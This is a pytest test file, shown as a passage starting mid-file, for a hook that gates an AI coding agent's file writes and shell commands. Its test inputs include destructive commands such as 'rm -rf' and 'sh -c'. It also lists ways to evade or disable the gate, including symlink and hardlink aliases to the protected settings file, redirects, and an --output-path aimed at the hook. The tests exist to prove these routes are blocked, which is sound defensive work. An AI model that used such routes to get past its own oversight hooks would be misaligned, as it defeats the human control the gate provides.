    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present", opted_in=False)
    assert cp.returncode == 2, cp.stderr


def test_v123_governance_writes_allowed_for_bootstrap(tmp_path):
    """Finding 2: writing the marker itself (and anything under .consensus/ /
    consensus-state/) is allowed even with no prior approval - otherwise the gate
    cannot mint its own marker (circular lock)."""
    for rel in (".consensus/design-approved", "consensus-state/active/x/goal_packet.yaml"):
        ev = {"tool_name": "Write", "tool_input": {"file_path": rel}, "cwd": str(tmp_path)}
        cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present", opted_in=True)
        assert cp.returncode == 0, f"{rel}: {cp.stderr}"


def test_v123_grep_with_pipe_regex_allowed(tmp_path):
    """Finding 3: a read-only grep whose regex contains | alternation is allowed
    (the | is inside quotes, not a pipeline separator)."""
    ev = {"tool_name": "Bash",
          "tool_input": {"command": "grep -E 'PreToolUse|Stop|SessionStart' settings.json"},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present", opted_in=True)
    assert cp.returncode == 0, cp.stderr


def test_v123_real_pipeline_still_denied(tmp_path):
    """Regression: a genuine pipeline with a non-allowlisted segment is still denied
    (the splitter fix must not over-allow)."""
    ev = {"tool_name": "Bash", "tool_input": {"command": "cat x | rm -rf y"}, "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present", opted_in=True)
    assert cp.returncode == 2, cp.stderr


# --- v1.24 gate hardening (full-init review 2026-05-23) ---------------------- #

@pytest.mark.parametrize("command", [
    "pytest -q",
    "python -m pytest tests/ -q",
    "python3 -m pytest",
])
def test_v124_pytest_no_longer_allowlisted(tmp_path, command):
    """codex: pytest executes arbitrary test/conftest code -> not read-only."""
    ev = {"tool_name": "Bash", "tool_input": {"command": command}, "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present", opted_in=True)
    assert cp.returncode == 2, cp.stderr


@pytest.mark.parametrize("command", [
    "cat x & rm -rf y",          # single & background -> writer after it
    "ls & python -c 'x'",
    "grep foo x & sh -c 'bad'",
])
def test_v124_single_ampersand_writer_denied(tmp_path, command):
    """kimi BLOCKING: a single & is a separator; a writer after it must be denied."""
    ev = {"tool_name": "Bash", "tool_input": {"command": command}, "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present", opted_in=True)
    assert cp.returncode == 2, cp.stderr


def test_v124_grep_with_escaped_quote_and_pipe_allowed(tmp_path):
    """gemini: backslash-escaped quote + | inside double quotes stays ONE read-only
    segment (boundary detection must not be fooled by the escape)."""
    ev = {"tool_name": "Bash",
          "tool_input": {"command": 'grep -E "a\\"b|c" file'}, "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present", opted_in=True)
    assert cp.returncode == 0, cp.stderr


def test_v124_governance_symlink_escape_denied(tmp_path):
    """kimi BLOCKING: if .consensus symlinks to the repo root (or /), the governance
    bootstrap allow must NOT become a universal write bypass."""
    import os as _os
    (tmp_path / ".consensus").symlink_to(tmp_path)  # .consensus -> repo root
    ev = {"tool_name": "Write", "tool_input": {"file_path": "src/evil.py"}, "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present", opted_in=True)
    assert cp.returncode == 2, cp.stderr


# --- v1.25 gate hardening (v1.24 convergence re-review 2026-05-23) ----------- #

@pytest.mark.parametrize("command,allowed", [
    ("git branch", True),
    ("git branch -a", True),
    ("git branch -v", True),
    ("git branch --merged", True),
    ("git branch -d feature", False),       # delete
    ("git branch -D feature", False),
    ("git branch -m old new", False),       # rename
    ("git branch newbranch", False),        # create (bare name)
])
def test_v125_git_branch_write_variants_denied(tmp_path, command, allowed):
    """kimi: `git branch` write forms (delete/rename/create) are not read-only."""
    ev = {"tool_name": "Bash", "tool_input": {"command": command}, "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present", opted_in=True)
    assert cp.returncode == (0 if allowed else 2), (command, cp.stderr)


@pytest.mark.parametrize("command,allowed", [
    ("(rm -rf x)", False),                  # subshell -> writer
    ("ls; (rm x)", False),                  # subshell after separator
    ("grep '(foo)' file", True),            # parens in a QUOTED arg -> fine
    ("grep -E '(a|b)' file", True),
])
def test_v125_subshell_parens(tmp_path, command, allowed):
    """gemini: a subshell command token is denied; quoted parens in args are not."""
    ev = {"tool_name": "Bash", "tool_input": {"command": command}, "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present", opted_in=True)
    assert cp.returncode == (0 if allowed else 2), (command, cp.stderr)


def test_v125_governance_dir_symlink_to_inrepo_denied(tmp_path):
    """codex BLOCKING: a .consensus SYMLINK (even to an in-repo dir) must NOT grant
    the governance bootstrap allow -> writing through it is gated, not bypassed."""
    (tmp_path / "src").mkdir()
    (tmp_path / ".consensus").symlink_to(tmp_path / "src")  # .consensus -> src/
    ev = {"tool_name": "Write",
          "tool_input": {"file_path": ".consensus/design-approved"}, "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present", opted_in=True)
    assert cp.returncode == 2, cp.stderr


# --- v1.26 gate hardening (round-3 convergence re-review) -------------------- #

@pytest.mark.parametrize("command,allowed", [
    ("git diff --ext-diff", False),            # runs a repo-configured external diff
    ("git log --textconv", False),             # runs a repo-configured textconv
    ("git diff --output=/tmp/x", False),       # writes a file
    ("git branch --contains abc123", True),    # read-only positional now allowed
    ("git branch --merged main", True),
    ("git branch --points-at HEAD", True),
    ("git branch -d feature", False),          # still: delete is a write
    ("git branch newbranch", False),           # still: bare positional = create
])
def test_v126_git_exec_flags_and_branch_positionals(tmp_path, command, allowed):
    ev = {"tool_name": "Bash", "tool_input": {"command": command}, "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present", opted_in=True)
    assert cp.returncode == (0 if allowed else 2), (command, cp.stderr)


@pytest.mark.parametrize("command,allowed", [
    ("git branch --list 'feat*'", True),    # v1.27: read-only listing pattern allowed
    ("git branch --list", True),
    ("git branch evil", False),             # still: bare positional = create
])
def test_v127_git_branch_list_pattern(tmp_path, command, allowed):
    ev = {"tool_name": "Bash", "tool_input": {"command": command}, "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present", opted_in=True)
    assert cp.returncode == (0 if allowed else 2), (command, cp.stderr)


# --------------------------------------------------------------------------- #
# v1.30.4 - gate scope (consult iteration-gate-scope-design-2026-05-24):
# protected-install tamper guard (always-on) + 3-class out-of-repo ALLOW.
# --------------------------------------------------------------------------- #

def _gate_scope_env(tmp_path, monkeypatch):
    """Fake ~/.claude (enforcement surface) + a SIBLING repo so in-repo, out-of-repo, and
    protected paths are all distinct. Path.home() in the subprocess reads $HOME (POSIX) or
    %USERPROFILE% (Windows) - both set below, threaded through _run_hook's dict(os.environ).
    Returns (repo_root, claude_dir)."""
    fake_home = tmp_path / "home"
    claude = fake_home / ".claude"
    (claude / "hooks").mkdir(parents=True)
    (claude / "settings.json").write_text("{}", encoding="utf-8")
    (claude / "hooks" / "consensus_pretooluse_gate.py").write_text("# hook\n", encoding="utf-8")
    (claude / "projects" / "proj" / "memory").mkdir(parents=True)
    monkeypatch.setenv("HOME", str(fake_home))
    # The hook computes the protected surface from Path.home(). On POSIX that reads $HOME,
    # but on Windows it reads %USERPROFILE% (ntpath.expanduser ignores $HOME) - so without
    # this the Windows hook resolves the REAL profile, the fixture's settings.json looks
    # unprotected, and the DENY assertions fail (ALLOW 0 != DENY 2). Set both for portability.
    monkeypatch.setenv("USERPROFILE", str(fake_home))
    repo_root = tmp_path / "repo"
    repo_root.mkdir()
    return repo_root, claude


def _edit_ev(file_path, repo_root):
    return {"tool_name": "Write", "tool_input": {"file_path": str(file_path)},
            "cwd": str(repo_root)}


def test_gatescope_settings_json_denied_opted_in(tmp_path, monkeypatch):
    repo_root, claude = _gate_scope_env(tmp_path, monkeypatch)
    cp = _run_hook(PRETOOLUSE, _edit_ev(claude / "settings.json", repo_root),
                   repo_root=repo_root, runtime="present", opted_in=True)
    assert cp.returncode == 2, cp.stderr


def test_gatescope_settings_json_denied_NON_opted_in(tmp_path, monkeypatch):
    # ALWAYS-ON: the tamper guard fires BEFORE the opt-in early-return (the threat is global).
    repo_root, claude = _gate_scope_env(tmp_path, monkeypatch)
    cp = _run_hook(PRETOOLUSE, _edit_ev(claude / "settings.json", repo_root),
                   repo_root=repo_root, runtime="present", opted_in=False)
    assert cp.returncode == 2, cp.stderr


def test_gatescope_consensus_hook_denied(tmp_path, monkeypatch):
    repo_root, claude = _gate_scope_env(tmp_path, monkeypatch)
    cp = _run_hook(PRETOOLUSE,
                   _edit_ev(claude / "hooks" / "consensus_pretooluse_gate.py", repo_root),
                   repo_root=repo_root, runtime="present", opted_in=False)
    assert cp.returncode == 2, cp.stderr


def test_gatescope_symlink_escape_to_settings_denied(tmp_path, monkeypatch):
    repo_root, claude = _gate_scope_env(tmp_path, monkeypatch)
    link = repo_root / "innocent.json"
    try:
        link.symlink_to(claude / "settings.json")
    except (OSError, NotImplementedError):
        pytest.skip("symlinks unsupported on this platform")
    cp = _run_hook(PRETOOLUSE, _edit_ev(link, repo_root),
                   repo_root=repo_root, runtime="present", opted_in=True)
    assert cp.returncode == 2, cp.stderr  # resolved through the symlink -> protected


def test_gate_disable_escape_hatch_allows_otherwise_denied(tmp_path, monkeypatch):
    # v1.30.5 operator escape hatch: CONSENSUS_MCP_GATE_DISABLE=1 fully disables the gate so
    # the human trust-root is NEVER deadlocked ("can't mint a seal" must not mean "can't work").
    repo_root, claude = _gate_scope_env(tmp_path, monkeypatch)
    monkeypatch.setenv("CONSENSUS_MCP_GATE_DISABLE", "1")
    # would normally be DENIED (in-repo, opted-in, no sealed marker) -> now allowed:
    cp = _run_hook(PRETOOLUSE, _edit_ev(repo_root / "src" / "x.py", repo_root),
                   repo_root=repo_root, runtime="present", opted_in=True)
    assert cp.returncode == 0, cp.stderr
    # FULL override: even the protected enforcement surface is allowed (the operator
    # deliberately lifted the gate; an in-session agent can't set this in the launch env).
    cp2 = _run_hook(PRETOOLUSE, _edit_ev(claude / "settings.json", repo_root),
                    repo_root=repo_root, runtime="present", opted_in=True)
    assert cp2.returncode == 0, cp2.stderr


def test_gate_disable_unset_still_enforces(tmp_path, monkeypatch):
    # no regression: without the escape hatch, the same in-repo no-marker write is denied.
    repo_root, claude = _gate_scope_env(tmp_path, monkeypatch)
    monkeypatch.delenv("CONSENSUS_MCP_GATE_DISABLE", raising=False)
    cp = _run_hook(PRETOOLUSE, _edit_ev(repo_root / "src" / "x.py", repo_root),
                   repo_root=repo_root, runtime="present", opted_in=True)
    assert cp.returncode == 2, cp.stderr


def test_gatescope_hardlink_alias_to_settings_denied(tmp_path, monkeypatch):
    # codex-rev-001 / gemini-rev-001 (v1.30.4): a HARDLINK to a protected file resolves to
    # its OWN path, so a pathname-only guard misses it -> the inode-identity check must catch
    # it. (Reachable in a non-opted-in project where Bash `ln` isn't denied.)
    repo_root, claude = _gate_scope_env(tmp_path, monkeypatch)
    alias = repo_root / "alias.json"
    try:
        os.link(claude / "settings.json", alias)  # hardlink: same inode, different path
    except (OSError, NotImplementedError, AttributeError):
        pytest.skip("hardlinks unsupported on this platform")
    cp = _run_hook(PRETOOLUSE, _edit_ev(alias, repo_root),
                   repo_root=repo_root, runtime="present", opted_in=True)
    assert cp.returncode == 2, cp.stderr


def test_gatescope_memory_dir_allowed_opted_in(tmp_path, monkeypatch):
    # THE reported bug: the agent's memory dir (out-of-repo, not protected) must be writable.
    repo_root, claude = _gate_scope_env(tmp_path, monkeypatch)
    mem = claude / "projects" / "proj" / "memory" / "note.md"
    cp = _run_hook(PRETOOLUSE, _edit_ev(mem, repo_root),
                   repo_root=repo_root, runtime="present", opted_in=True)
    assert cp.returncode == 0, cp.stderr


def test_gatescope_other_claude_file_allowed(tmp_path, monkeypatch):
    # MINIMAL protected set: a non-enforcement ~/.claude file is NOT protected -> allowed.
    repo_root, claude = _gate_scope_env(tmp_path, monkeypatch)
    cp = _run_hook(PRETOOLUSE, _edit_ev(claude / "todos" / "scratch.json", repo_root),
                   repo_root=repo_root, runtime="present", opted_in=True)
    assert cp.returncode == 0, cp.stderr


def test_gatescope_tmp_scratch_allowed_opted_in(tmp_path, monkeypatch):
    repo_root, claude = _gate_scope_env(tmp_path, monkeypatch)
    cp = _run_hook(PRETOOLUSE, _edit_ev(tmp_path / "elsewhere" / "scratch.txt", repo_root),
                   repo_root=repo_root, runtime="present", opted_in=True)
    assert cp.returncode == 0, cp.stderr


def test_gatescope_in_repo_no_approval_still_denied(tmp_path, monkeypatch):
    # NO REGRESSION: an in-repo write without a sealed marker is still denied.
    repo_root, claude = _gate_scope_env(tmp_path, monkeypatch)
    cp = _run_hook(PRETOOLUSE, _edit_ev(repo_root / "src" / "x.py", repo_root),
                   repo_root=repo_root, runtime="present", opted_in=True)
    assert cp.returncode == 2, cp.stderr


def test_gatescope_in_repo_non_opted_in_allowed(tmp_path, monkeypatch):
    # NO REGRESSION: a non-opted-in repo fails OPEN for ordinary in-repo writes.
    repo_root, claude = _gate_scope_env(tmp_path, monkeypatch)
    cp = _run_hook(PRETOOLUSE, _edit_ev(repo_root / "src" / "x.py", repo_root),
                   repo_root=repo_root, runtime="present", opted_in=False)
    assert cp.returncode == 0, cp.stderr


def test_gatescope_bash_redirect_to_settings_still_denied(tmp_path, monkeypatch):
    # NO REGRESSION: default-deny Bash still blocks a redirect to the enforcement surface.
    repo_root, claude = _gate_scope_env(tmp_path, monkeypatch)
    ev = {"tool_name": "Bash",
          "tool_input": {"command": f"echo x > {claude / 'settings.json'}"},
          "cwd": str(repo_root)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=repo_root, runtime="present", opted_in=True)
    assert cp.returncode == 2, cp.stderr


# --------------------------------------------------------------------------- #
# Q4 (M1-remediation, consult iteration-path-to-a-remediation-260caad1):
# a Bash-invoked consensus tool --output-path onto the enforcement surface is
# denied even though the tool is on the tooling allowlist (the exemption must
# not open a self-disable hole). ALWAYS-ON, like the EDIT_TOOLS guard above.
# --------------------------------------------------------------------------- #

def _bash_ev(command, repo_root):
    return {"tool_name": "Bash", "tool_input": {"command": command}, "cwd": str(repo_root)}


@pytest.mark.parametrize("template", [
    "consensus-mcp-harness-propose --output-path {settings}",
    "consensus-mcp-harness-propose --output-path={settings}",
    "consensus-mcp-harness-propose --max-records 50 --output-path {settings}",
    # argparse abbreviation of --output-path (allow_abbrev) still resolves to it.
    "consensus-mcp-harness-propose --output {settings}",
])
def test_gatescope_bash_harness_output_path_to_settings_denied(tmp_path, monkeypatch, template):
    repo_root, claude = _gate_scope_env(tmp_path, monkeypatch)
    command = template.format(settings=claude / "settings.json")
    cp = _run_hook(PRETOOLUSE, _bash_ev(command, repo_root),
                   repo_root=repo_root, runtime="present", opted_in=True)
    assert cp.returncode == 2, cp.stderr
    assert "output-path" in cp.stderr


def test_gatescope_bash_harness_output_path_to_hook_denied(tmp_path, monkeypatch):
    repo_root, claude = _gate_scope_env(tmp_path, monkeypatch)
    hook = claude / "hooks" / "consensus_pretooluse_gate.py"
    cp = _run_hook(PRETOOLUSE, _bash_ev(f"consensus-mcp-harness-propose --output-path {hook}", repo_root),
                   repo_root=repo_root, runtime="present", opted_in=True)
    assert cp.returncode == 2, cp.stderr


def test_gatescope_bash_harness_output_path_denied_NON_opted_in(tmp_path, monkeypatch):
    # ALWAYS-ON: the Bash --output-path floor fires BEFORE the opt-in/activation
    # early-return, exactly like the EDIT_TOOLS protected-install guard (the
    # self-disable threat is global, not scoped to opted-in projects).
    repo_root, claude = _gate_scope_env(tmp_path, monkeypatch)
    command = f"consensus-mcp-harness-propose --output-path {claude / 'settings.json'}"
    cp = _run_hook(PRETOOLUSE, _bash_ev(command, repo_root),
                   repo_root=repo_root, runtime="present", opted_in=False)
    assert cp.returncode == 2, cp.stderr


def test_gatescope_bash_harness_output_path_symlink_escape_denied(tmp_path, monkeypatch):
    # A repo-local symlink whose target is settings.json is resolved through -> denied.
    repo_root, claude = _gate_scope_env(tmp_path, monkeypatch)
    link = repo_root / "innocent.yaml"
    try:
        link.symlink_to(claude / "settings.json")
    except (OSError, NotImplementedError):
        pytest.skip("symlinks unsupported on this platform")
    cp = _run_hook(PRETOOLUSE, _bash_ev(f"consensus-mcp-harness-propose --output-path {link}", repo_root),
                   repo_root=repo_root, runtime="present", opted_in=True)
    assert cp.returncode == 2, cp.stderr


def test_gatescope_bash_harness_output_path_safe_still_allowed(tmp_path, monkeypatch):
    # NO REGRESSION: a safe --output-path (under consensus-state/) keeps the
    # tooling allowlist exemption -> allowed. Only the enforcement surface is denied.
    repo_root, claude = _gate_scope_env(tmp_path, monkeypatch)
    command = "consensus-mcp-harness-propose --output-path consensus-state/state/harness-proposal.yaml"
    cp = _run_hook(PRETOOLUSE, _bash_ev(command, repo_root),
                   repo_root=repo_root, runtime="present", opted_in=True)
    assert cp.returncode == 0, cp.stderr


def test_gatescope_bash_consensus_tooling_without_output_path_unaffected(tmp_path, monkeypatch):
    # NO REGRESSION: consensus tooling that carries no --output-path is untouched
    # by the new guard (it only inspects --output-path values).
    repo_root, claude = _gate_scope_env(tmp_path, monkeypatch)
    command = "consensus-mcp-dispatch-codex --goal-packet gp.yaml --iteration-dir d"
    cp = _run_hook(PRETOOLUSE, _bash_ev(command, repo_root),
                   repo_root=repo_root, runtime="present", opted_in=True)
    assert cp.returncode == 0, cp.stderr


# --------------------------------------------------------------------------- #
# v1.33 gate-consistency fix - dormant-by-default parity across ALL three hooks.
# The Stop gate and the SessionStart/UserPromptSubmit injector previously fired
# in EVERY repo (gated only on `consensus-init` being on PATH), nagging everyday
# non-consensus work. They now share the PreToolUse gate's activation predicate
# (consensus_mcp._session_state.gate_should_enforce): NO-OP / silent when no
# consult is in flight; active only when a real session marker (or opt-in) says so.
# --------------------------------------------------------------------------- #

def _activate_session(repo_root, ref="iteration-live"):
    """Write a REAL live session marker (not the env override) pointing at an
    unsealed iteration dir, so gate_should_enforce(repo_root) is True."""
    from consensus_mcp._session_state import write_session_marker
    _make_sealed_iteration(repo_root, ref, closing_state="in_progress")
    write_session_marker(repo_root, iteration_id=ref, scope_glob="src/**",
                         activated_by="test", activation_source="test_fixture")


def test_stop_dormant_no_directive(tmp_path):
    # No consult in flight (opted_in=False, no session marker): the Stop gate is
    # a NO-OP even with a modified source file lacking a delivery token.
    _git_repo_with_modified_source(tmp_path, "src/app.py")
    ev = {"hook_event_name": "Stop", "cwd": str(tmp_path)}
    cp = _run_hook(STOP, ev, repo_root=tmp_path, runtime="present", opted_in=False)
    assert cp.returncode == 0, cp.stderr
    assert "STOP" not in cp.stdout, cp.stdout


def test_stop_active_via_session_marker_emits(tmp_path):
    # A real live session marker activates the gate WITHOUT the env override.
    _git_repo_with_modified_source(tmp_path, "src/app.py")
    _activate_session(tmp_path)
    ev = {"hook_event_name": "Stop", "cwd": str(tmp_path)}
    cp = _run_hook(STOP, ev, repo_root=tmp_path, runtime="present", opted_in=False)
    assert cp.returncode == 0, cp.stderr
    assert "STOP" in cp.stdout, cp.stdout
    assert "src/app.py" in cp.stdout, cp.stdout


def test_sessionstart_dormant_silent(tmp_path):
    # Runtime present but dormant -> SILENT (no precedence framing injected).
    ev = {"hook_event_name": "SessionStart", "source": "startup",
          "cwd": str(tmp_path)}
    cp = _run_hook(SESSIONSTART, ev, repo_root=tmp_path, runtime="present",
                   opted_in=False)
    assert cp.returncode == 0, cp.stderr
    assert cp.stdout.strip() == "", cp.stdout


def test_sessionstart_active_via_session_marker_injects(tmp_path):
    _activate_session(tmp_path)
    ev = {"hook_event_name": "SessionStart", "source": "startup",
          "cwd": str(tmp_path)}
    cp = _run_hook(SESSIONSTART, ev, repo_root=tmp_path, runtime="present",
                   opted_in=False)
    assert cp.returncode == 0, cp.stderr
    ctx = json.loads(cp.stdout)["hookSpecificOutput"]["additionalContext"].lower()
    assert "precedence" in ctx, ctx


def test_sessionstart_dormant_runtime_absent_still_notices(tmp_path):
    # Dormancy does NOT swallow the runtime-absent notice: absence stays visible.
    ev = {"hook_event_name": "SessionStart", "source": "startup",
          "cwd": str(tmp_path)}
    cp = _run_hook(SESSIONSTART, ev, repo_root=tmp_path, runtime="absent",
                   opted_in=False)
    assert cp.returncode == 0, cp.stderr
    ctx = json.loads(cp.stdout)["hookSpecificOutput"]["additionalContext"].lower()
    assert "not detected" in ctx


def test_userpromptsubmit_dormant_silent(tmp_path):
    ev = {"hook_event_name": "UserPromptSubmit", "cwd": str(tmp_path)}
    cp = _run_hook(SESSIONSTART, ev, repo_root=tmp_path, runtime="present",
                   opted_in=False)
    assert cp.returncode == 0, cp.stderr
    assert cp.stdout.strip() == "", cp.stdout
